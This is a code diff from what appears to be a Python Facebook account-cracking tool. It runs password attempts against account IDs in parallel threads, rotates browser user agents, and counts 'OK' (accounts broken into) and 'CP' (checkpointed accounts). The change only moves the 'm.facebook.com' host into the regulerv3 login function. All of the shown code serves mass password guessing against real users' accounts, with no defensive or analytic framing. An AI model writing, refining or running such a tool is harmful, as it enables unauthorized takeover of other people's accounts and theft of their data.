@@ -1336,11 +1336,11 @@ def passwrd():
                 if 'reguler' in method:
                     pool.submit(reguler,idf,pwv)
                 elif 'mbasic' in method:
-                    pool.submit(regulerv3,idf,pwv,'m.facebook.com')
+                    pool.submit(regulerv3,idf,pwv)
                 elif 'validate' in method:
                     pool.submit(mbasic,idf,pwv)
                 else:
-                    pool.submit(regulerv3,idf,pwv,'m.facebook.com')
+                    pool.submit(regulerv3,idf,pwv)
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
@@ -1354,12 +1354,13 @@ def passwrd():
         exit()
 
 
-def regulerv3(idf,pwv,url):
+def regulerv3(idf,pwv):
 	global loop,ok,cp
 	rr = random.randint
 	rc = random.choice
 	prog.update(des,description=f'\r[bold white]Reguler V3[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
 	prog.advance(des)
+	url = "m.facebook.com"
 	ua = rc(ugen)
 	ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
 	ses = requests.Session()
